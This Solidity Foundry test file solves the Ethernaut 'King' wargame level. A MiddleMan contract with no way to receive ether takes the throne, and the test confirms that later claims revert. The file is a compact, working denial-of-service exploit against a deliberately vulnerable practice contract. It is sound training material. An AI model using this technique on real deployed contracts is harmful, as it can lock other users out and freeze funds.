// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/King.sol";

contract MiddleMan {
    function callKing(address king) public payable {
        king.call{value: msg.value}("");
    }
}

// write a contract that cannot receive ether transfer to block a new king
contract KingTest is Test {
    King instance;

    function setUp() public {
        vm.prank(msg.sender);
        instance = new King{value: 0.001 ether}();
    }

    function test() public {
        assertEq(instance.king(), msg.sender);

        MiddleMan middleMan = new MiddleMan();

        // somehow needs to transfer > the original amount in practice
        middleMan.callKing{value: 0.002 ether}(address(instance));
        assertEq(instance.king(), address(middleMan));

        vm.expectRevert();
        address(instance).call{value: 0.001 ether}("");
    }
}
